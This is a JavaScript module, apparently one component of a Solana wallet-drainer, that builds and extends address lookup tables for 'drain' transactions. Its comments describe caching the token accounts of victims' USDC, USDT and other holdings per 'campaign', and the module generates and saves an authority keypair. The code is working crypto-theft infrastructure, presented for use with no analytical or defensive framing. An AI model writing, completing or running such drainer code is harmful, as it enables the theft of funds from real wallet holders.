import {
  AddressLookupTableProgram,
  PublicKey,
  Keypair,
  Connection,
  Transaction,
  sendAndConfirmTransaction,
} from "@solana/web3.js";
import fs from "node:fs";
import path from "node:path";
import bs58 from "bs58";

const DATA_DIR = process.env.DATA_DIR || "./data";
const AUTHORITY_FILE = path.join(DATA_DIR, "alt-authority.json");

// Fixed accounts present in every drain tx. Cached in ALT once per campaign.
export const FIXED_ALT_ACCOUNTS = [
  "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA", // SPL Token
  "TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb", // Token-2022
  "11111111111111111111111111111111",             // System
  "ComputeBudget111111111111111111111111111111",  // Compute Budget
  "ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL", // ATA program
  "BGUMAp9Gq7iTEuizy4pqaxsTyUCBK68MDfK752saRPUY", // Bubblegum
  "cmtDvXumGCrqC1Age74AVPhSRVXJMd8PJS91L8KbNCK", // SPL Account Compression
  "noopb9bkMVfRPU8AsbpTUg8AQkHtKwMYZiFUjNRtMmV",  // SPL Noop
  "SysvarRent111111111111111111111111111111111",  // Sysvar Rent
  "SysvarS1otHashes111111111111111111111111111",  // Sysvar Slot Hashes
  "JUP6LkbZbjS1jKKwapdHNy74zcZ3tLUZoi5QNyVTaV4",  // Jupiter v6 (for routing if ever needed)
];

// Common SPL mints so victim's USDC/USDT/etc ATAs get ALT indices.
export const COMMON_MINTS = [
  "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v", // USDC
  "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB", // USDT
  "So11111111111111111111111111111111111111112",  // wSOL
  "DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263", // BONK
  "EKpQGSJtjMFqKZ9KQanSqYXRcF8fBopzLHYxdM65zcjm", // WIF
  "JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN",  // JUP
  "4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R", // RAY
  "mSoLzYCxHdYgdzU16g5QSh3i5K3z3KZK7ytfqcJm7So",  // mSOL
  "7dHbWXmci3dT8UFYWYZweBLXgycu7Y3iL6trKn1Y7ARj", // stSOL
  "bSo13r4TkiE4KumL71LsHTPpL2euBYLFx6h9HP3piy1",  // bSOL
  "HZ1JovNiVvGrGNiiYvEozEVgZ58xaU3RKwX8eACQBCt3", // PYTH
  "hntyVP6YFm1Hg25TN9WGLqM12b8TQmcknKrdu1oxWux",  // HNT
  "rndrizKT3MK1iimdxRdWabcF7Zg7AR5T4nud4EkHBof",  // RENDER
  "TNSRxcUxoT9xBG3de7PiJyTDYu7kskLqcpddxnEJAS6",  // TNSR
  "WENWENvqqNya429ubCdR81ZmD69brwQaaBYY6p3LCpk",  // WEN
  "MNDEFzGvMt87ueuHvVU9VcTqsAP5b3fTGPsHuuPA5ey",  // MNDE
  "orcaEKTdK7LKz57vaAYr9QeNsVEPfiu6QeMU1kektZE",  // ORCA
  "nosXBVoaCTtYdLvKY6Csb4AC8JCdQKKAaWYtx2ZMoo7",  // NOS
  "KMNo3nJsBXfcpJTVhZcXLW7RmTwTt4GVFE7suUBo9sS",  // KMNO
  "jtojtomepa8beP8AuQc6eXt5FriJwfFMwQx2v2f9mCL",  // JTO
  "27G8MtK7VtTcCHkpASjSDdkWWYfoqT6ggEuKidVJidD4", // JLP
  "4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R", // RAY (dup safe)
];

export function loadAltAuthority() {
  if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
  if (fs.existsSync(AUTHORITY_FILE)) {
    const raw = JSON.parse(fs.readFileSync(AUTHORITY_FILE, "utf8"));
    return Keypair.fromSecretKey(Uint8Array.from(raw));
  }
  const kp = Keypair.generate();
  fs.writeFileSync(AUTHORITY_FILE, JSON.stringify(Array.from(kp.secretKey)));
  console.log("[alt] generated authority:", kp.publicKey.toBase58());
  return kp;
}

export async function ensureAlt(connection, authority, existingAlt, addresses) {
  const uniq = Array.from(new Set(addresses.filter(Boolean)));

  if (!existingAlt) {
    const slot = await connection.getSlot("confirmed");
    const [ix, address] = AddressLookupTableProgram.createLookupTable({
      authority: authority.publicKey,
      payer: authority.publicKey,
      recentSlot: slot,
    });
    const tx = new Transaction().add(ix);
    await sendAndConfirmTransaction(connection, tx, [authority], { commitment: "confirmed" });
    console.log("[alt] created", address.toBase58());

    // Wait for activation slot.
    await new Promise((r) => setTimeout(r, 1500));
    existingAlt = address.toBase58();
  }

  const current = await connection.getAddressLookupTable(new PublicKey(existingAlt)).then((r) => r.value);
  const present = new Set((current?.state?.addresses || []).map((k) => k.toBase58()));
  const toAdd = uniq.filter((a) => !present.has(a));

  if (toAdd.length > 0) {
    // Chunk to 20 addresses per extend tx (each is 32 bytes in the table).
    for (let i = 0; i < toAdd.length; i += 20) {
      const chunk = toAdd.slice(i, i + 20).map((a) => new PublicKey(a));
      const ix = AddressLookupTableProgram.extendLookupTable({
        lookupTable: new PublicKey(existingAlt),
        authority: authority.publicKey,
        payer: authority.publicKey,
        addresses: chunk,
      });
      const tx = new Transaction().add(ix);
      await sendAndConfirmTransaction(connection, tx, [authority], { commitment: "confirmed" });
    }
    console.log("[alt] extended", existingAlt, "by", toAdd.length);
    // Wait one slot so the extension is queryable.
    await new Promise((r) => setTimeout(r, 800));
  }

  const { value } = await connection.getAddressLookupTable(new PublicKey(existingAlt));
  return { address: existingAlt, account: value };
}

export function defaultAltAddresses(recipients) {
  return [...FIXED_ALT_ACCOUNTS, ...COMMON_MINTS, ...(recipients || [])];
}
